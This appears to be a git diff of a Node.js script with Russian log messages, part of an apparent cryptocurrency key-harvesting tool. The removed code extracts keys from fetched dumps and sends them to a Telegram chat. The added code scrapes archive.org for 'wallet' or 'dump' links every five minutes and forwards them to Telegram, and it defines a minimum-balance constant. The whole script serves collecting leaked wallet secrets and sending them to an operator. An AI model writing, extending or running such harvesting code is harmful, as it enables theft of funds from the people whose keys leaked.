@@ -1,29 +1,31 @@
-const { fetchAndStoreDumps } = require('./fetcher');
-const { extractFromAllFiles } = require('./extractor');
-const { sendTelegramMessage } = require('./telegram');
+const { Telegraf } = require('telegraf');
 const { fetchArchiveDumps } = require('./archiveScraper');
+const dotenv = require('dotenv');
+dotenv.config();
 
-async function main() {
-  console.log('🌀 Запуск основной логики...');
+const bot = new Telegraf(process.env.BOT_TOKEN);
 
-  await fetchAndStoreDumps();
+const MIN_BALANCE = 0.001;
 
-  const keys = extractFromAllFiles();
-  if (keys.length > 0) {
-    console.log(`🔑 Найдено всего ключей: ${keys.length}`);
-    for (const key of keys) {
-      console.log(`🧷 ${key}`);
-    }
-    await sendTelegramMessage(keys.join('\n'), `💰 Найдено ключей: ${keys.length}`);
-  } else {
-    console.log('❌ Ключи не найдены.');
-  }
-
-  const dumpLinks = await fetchArchiveDumps();
-  console.log('📁 Найдено archive.org дампов:', dumpLinks.length);
-  for (const link of dumpLinks) {
-    console.log(`📎 ${link}`);
+async function checkDump(link) {
+  // Здесь может быть логика анализа дампа по ссылке
+  if (link.includes('wallet') || link.includes('dump')) {
+    await bot.telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, `Найден архивный дамп:\n${link}`);
+    console.log('Отправлено в Telegram:', link);
   }
 }
 
-main();
+async function mainCycle() {
+  console.log('Запуск цикла...');
+  try {
+    const archiveLinks = await fetchArchiveDumps();
+    for (const link of archiveLinks) {
+      await checkDump(link);
+    }
+  } catch (err) {
+    console.error('Ошибка в цикле:', err);
+  }
+}
+
+setInterval(mainCycle, 1000 * 60 * 5); // каждые 5 минут
+mainCycle();
